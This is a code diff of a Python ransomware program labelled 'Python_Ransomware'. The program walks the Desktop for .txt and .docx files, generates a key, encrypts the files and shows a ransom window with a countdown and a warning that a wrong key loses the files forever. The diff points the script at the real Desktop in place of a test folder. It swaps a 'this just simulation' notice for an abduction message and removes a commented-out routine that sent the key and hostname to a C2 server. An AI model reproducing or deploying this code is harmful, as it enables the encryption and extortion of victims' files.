@@ -2,7 +2,6 @@
 import os
 import random
 import base64
-import socket
 from threading import Thread
 from queue import Queue
 import getpass
@@ -16,16 +15,16 @@ extend = "\\"
 pc_username = getpass.getuser()
 desktop_path = "C:\\Users\\"+pc_username+"\\Desktop"
 decrypt_key = "decrypt_key.txt"
-safeguard = input("Are you sure you wanna run this program ? Y/N \n")
-if safeguard != 'Y':
+safeguard = input("Are you sure you want to run this program ? y/n \n")
+if safeguard != 'y':
     quit()
 
 #files to be encrypted
-Extension_to_be_encrypted = ('.txt','.docx' , )
+Extension_to_be_encrypted = ('.txt','.docx' , )#you can add as many extension as you want here
 
 #Grab all the files with the required extension
 file_lists_paths = []
-for root, dirs, files in os.walk("C:\\Users\\"+pc_username+"\\Music\\Copy") :
+for root, dirs, files in os.walk("C:\\Users\\"+pc_username+"\\Desktop") :
     for file in files :
         file_path, file_ext = os.path.splitext(root+extend+file) #separate the name and the extension
         if file_ext in Extension_to_be_encrypted :
@@ -46,7 +45,6 @@ combined_characters = lower + upper + digits + special_characters
 key = ""
 encryption_level = 128 // 8     #this is how many bytes the encryption level is
 char_pool = []                  #character from which the key can be made of
-# for i in range (0x00 , 0xFF) :  #All possible character
 for i in (combined_characters) :  #All possible character
     char_pool.append(i)
 for i in range(encryption_level) :
@@ -57,17 +55,6 @@ with open(desktop_path + extend + decrypt_key , "w", encoding="utf-8") as f:
     f.write(key)
 
 print(key)
-
-#grab the hostname and sned it along with the key to the C2 server
-# hostname = os.getenv("COMPUTERNAME")
-#connect to C2 SERVER
-# ip_address = "127.0.0.1"
-# port = 9000
-# with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s :
-#     s.connect((ip_address,port))
-#     s.send(f'[{time}] - {hostname} : {key}').encode('utf-8')
-
-
 
 #encrypt the files
 def encrypt(key):
@@ -103,7 +90,6 @@ print("Encryption Successful")
 
 def countdown(count):
     # change text in label
-    # count = '01:30:00'
     hour, minute, second = count.split(':')
     hour = int(hour)
     minute = int(minute)
@@ -128,7 +114,7 @@ root = tk.Tk()
 root.title('Python_Ransomware')
 root.geometry('500x300')
 root.resizable(False, False)
-label1 = tk.Label(root, text='Your data is under rest, please don\'t pay me,\nthis just simulation !!\n\n'
+label1 = tk.Label(root, text='Your data has been abducted by Python_Ransomware\n\n'
                              'WARNING: THERE IS NO SECOND ATTEMPT TO ENTER THE CORRECT KEY \n\n IF IT IS WRONG YOU LOSE YOUR FILES FOREVER', font=('calibri', 12,'bold'))
 label1.pack()
 label = tk.Label(root,font=('calibri', 50,'bold'), fg='red', bg='blue')
